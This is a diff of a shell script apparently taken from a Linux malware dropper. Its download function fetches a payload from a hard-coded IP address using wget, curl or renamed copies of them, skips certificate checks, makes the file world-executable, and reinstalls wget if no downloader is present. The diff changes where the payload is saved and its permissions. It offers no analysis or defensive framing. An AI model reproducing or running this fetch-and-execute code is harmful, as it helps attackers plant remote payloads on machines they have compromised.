@@ -14,22 +14,23 @@ m='http://192.99.226.65/m'
 function de() {
         /bin/rm -rf /tmp/liog
         if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
-                wget --no-check-certificate -c $1 -O /tmp/$2 && chmod +x /tmp/$2
+                wget --no-check-certificate -c $1 -O $2 && chmod 777 $2
         elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
-                curl -fs $1 -o /tmp/$2 && chmod +x /tmp/$2
+                curl -fs $1 -o $2 && chmod 777 $2
         elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
-                wge -c $1 -O /tmp/$2 && chmod +x /tmp/$2
+                wge -c $1 -O $2 && chmod 777 $2
         elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
-                get -c $1 -O /tmp/$2 && chmod +x /tmp/$2
+                get -c $1 -O $2 && chmod 777 $2
         elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
-                cur -fs $1 -o /tmp/$2 && chmod +x /tmp/$2
+                cur -fs $1 -o $2 && chmod 777 $2
         elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
-                url -fs $1 -o /tmp/$2 && chmod +x /tmp/$2
+                url -fs $1 -o $2 && chmod 777 $2
         else
                 rpm -e --nodeps wget
                 yum -y install wget
                 apt install -y wget
-                wget --no-check-certificate -c $1 -O /tmp/$2 && chmod +x /tmp/$2
+                wget --no-check-certificate -c $1 -O $2 && chmod 777 
+$2
         fi
 }
 
